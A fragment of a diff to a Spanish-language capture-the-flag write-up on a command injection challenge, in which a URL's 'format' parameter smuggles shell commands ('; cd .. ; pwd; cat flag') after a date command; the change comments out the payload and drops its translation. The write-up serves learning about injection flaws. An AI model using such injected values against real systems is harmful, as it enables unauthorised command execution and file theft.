@@ -4,8 +4,8 @@ Este desafío consistió en explotar una vulnerabilidad de inyección de comando
 🧠 Detalles de la Explotación
 💻 URL Vulnerable
 bash
-/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
-# Traducción: date '; cd .. ; pwd; cat flag'
+# /?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
+
 🛠️ Análisis Técnico
 🔧 Comando Base:
 
